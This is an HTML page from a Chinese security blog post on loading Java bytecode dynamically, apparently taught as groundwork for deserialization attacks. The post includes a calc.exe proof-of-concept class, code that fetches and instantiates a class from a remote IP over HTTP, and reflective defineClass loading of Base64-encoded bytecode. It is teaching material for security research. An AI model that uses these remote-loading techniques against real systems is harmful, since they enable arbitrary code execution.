@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Java动态加载字节码 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="java动态加载字节码">
+  <meta itemprop="datePublished" content="2024-08-16T09:39:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-16T09:39:01+08:00">
+  <meta itemprop="wordCount" content="454">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/12/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="java动态加载字节码">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-16T09:39:01+08:00">
+    <meta property="article:modified_time" content="2024-08-16T09:39:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java动态加载字节码">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/12/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "java动态加载字节码",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%9F%BA%E7%A1%80\/12\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  454 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%9F%BA%E7%A1%80\/12\/","datePublished": "2024-08-16T09:39:01+08:00","dateModified": "2024-08-16T09:39:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Java动态加载字节码</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Java动态加载字节码</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-16 09:39:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-16">2024-08-16</time></span>&nbsp;<span title="454 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="什么是java的字节码" class="heading-element"><span>0.0.0.1  什么是Java的“字节码”</span>
+  <a href="#%e4%bb%80%e4%b9%88%e6%98%afjava%e7%9a%84%e5%ad%97%e8%8a%82%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。</p>
+<p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台
+的JVM虚拟机中。甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121551716.webp" alt="image-20240812155118534" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121551716.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121551716.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121551716.webp?size=large 2x" data-title="image-20240812155118534" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>本文中所说的“字节码”，可以理解的更广义一些——所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在我们的探讨范围内。</p>
+<h5 id="利用urlclassloader加载远程class文件" class="heading-element"><span>0.0.0.2  利用URLClassLoader加载远程class文件</span>
+  <a href="#%e5%88%a9%e7%94%a8urlclassloader%e5%8a%a0%e8%bd%bd%e8%bf%9c%e7%a8%8bclass%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>Java的ClassLoader来用来加载字节码文件最基础的方法，我们曾在本系列最开头反射相关部分讲过：</p>
+<blockquote>
+<p>ClassLoader 是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的</p>
+<p>ClassLoader 就是根据类名来加载类，这个类名是类完整路径，如java.lang.Runtime 。</p>
+</blockquote>
+<p>ClassLoader的概念的确不是一语概之的，所以我本文也不做深入分析，本文要说到的是这个ClassLoader： URLClassLoader 。</p>
+<p>calc.class</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">com.test.TemplatesImpl</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">calc</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">Process</span> <span style="color:#58a1dd">process</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Runtime</span>.<span style="color:#58a1dd">getRuntime</span>().<span style="color:#58a1dd">exec</span>(<span style="color:#a6be9d">&#34;calc.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>            } <span style="color:#ff636f">catch</span> (<span style="color:#58a1dd">Exception</span> <span style="color:#58a1dd">e</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">e</span>.<span style="color:#58a1dd">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121705850.webp" alt="image-20240812170516620" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121705850.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121705850.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121705850.webp?size=large 2x" data-title="image-20240812170516620" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">com.test.TemplatesImpl</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.MalformedURLException</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.URL</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.net.URLClassLoader</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">URLClassLoaderTest</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">MalformedURLException</span>, <span style="color:#58a1dd">ClassNotFoundException</span>, <span style="color:#58a1dd">InstantiationException</span>, <span style="color:#58a1dd">IllegalAccessException</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">URL</span> <span style="color:#58a1dd">url</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">URL</span>(<span style="color:#a6be9d">&#34;http://110.40.177.201:8080/&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">URLClassLoader</span> <span style="color:#58a1dd">cl</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">URLClassLoader</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">URL</span><span style="color:#ff636f">[]</span>{<span style="color:#58a1dd">url</span>});
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Class</span> <span style="color:#58a1dd">c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">cl</span>.<span style="color:#58a1dd">loadClass</span>(<span style="color:#a6be9d">&#34;calc&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">c</span>.<span style="color:#58a1dd">newInstance</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><blockquote>
+<p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这 些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p>
+<p>URL没有以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件</p>
+<p>URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件</p>
+<p>URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</p>
+<p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。</p>
+</blockquote>
+<p>作为攻击者，如果我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。</p>
+<h5 id="利用classloaderdefineclass直接加载字节码" class="heading-element"><span>0.0.0.3  利用ClassLoader#defineClass直接加载字节码</span>
+  <a href="#%e5%88%a9%e7%94%a8classloaderdefineclass%e7%9b%b4%e6%8e%a5%e5%8a%a0%e8%bd%bd%e5%ad%97%e8%8a%82%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121720235.webp" alt="image-20240812172054076" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121720235.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121720235.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408121720235.webp?size=large 2x" data-title="image-20240812172054076" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<ul>
+<li>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass</li>
+<li>findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass</li>
+<li>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</li>
+</ul>
+<p>真正核心的部分其实是defineClass ，他决定了如何将一段字节流转变成一个Java类，Java默认的ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中。</p>
+<p>我们可以编写一个简单的代码，来演示如何让系统的defineClass 来直接加载字节码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">com.test.TemplatesImpl</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.lang.reflect.Method</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.util.Base64</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">HelloDefineClass</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Method</span> <span style="color:#58a1dd">defineClass</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ClassLoader</span>.<span style="color:#58a1dd">class</span>.<span style="color:#58a1dd">getDeclaredMethod</span>(<span style="color:#a6be9d">&#34;defineClass&#34;</span>, <span style="color:#58a1dd">String</span>.<span style="color:#58a1dd">class</span>, <span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span>.<span style="color:#58a1dd">class</span>, <span style="color:#ff636f">int</span>.<span style="color:#58a1dd">class</span>, <span style="color:#ff636f">int</span>.<span style="color:#58a1dd">class</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">defineClass</span>.<span style="color:#58a1dd">setAccessible</span>(<span style="color:#ff636f">true</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">code</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Base64</span>.<span style="color:#58a1dd">getDecoder</span>().<span style="color:#58a1dd">decode</span>(<span style="color:#a6be9d">&#34;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Class</span> <span style="color:#58a1dd">hello</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">Class</span>)<span style="color:#58a1dd">defineClass</span>.<span style="color:#58a1dd">invoke</span>(<span style="color:#58a1dd">ClassLoader</span>.<span style="color:#58a1dd">getSystemClassLoader</span>(), <span style="color:#a6be9d">&#34;Hello&#34;</span>, <span style="color:#58a1dd">code</span>, <span style="color:#58a1dd">0</span>, <span style="color:#58a1dd">code</span>.<span style="color:#58a1dd">length</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">hello</span>.<span style="color:#58a1dd">newInstance</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><blockquote>
+<p>注意一点，==在defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行==。而且，即使我们将初始化代码放在类的static块中（在本系列文章第一篇中进行过说明），在defineClass 时也无法被直接调用到。所以，如果我们==要使用defineClass 在目标机器上执行任意代码，需要想办法调用构造函数==。</p>
+<p>系统的ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链TemplatesImpl 的基石。</p>
+</blockquote>
+<h5 id="利用templatesimpl加载字节码" class="heading-element"><span>0.0.0.4  利用TemplatesImpl加载字节码</span>
+  <a href="#%e5%88%a9%e7%94%a8templatesimpl%e5%8a%a0%e8%bd%bd%e5%ad%97%e8%8a%82%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>虽然大部分上层开发者不会直接使用到defineClass方法，但是Java底层还是有一些类用到了它（否则他也没存在的价值了对吧），这就是TemplatesImpl 。</p>
+</blockquote>
+<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 这个类中定义了一个内部类TransletClassLoader ：</p>
+<p><code>Class defineClass(final byte[] b) {return defineClass(null, b, 0, b.length);}</code></p>
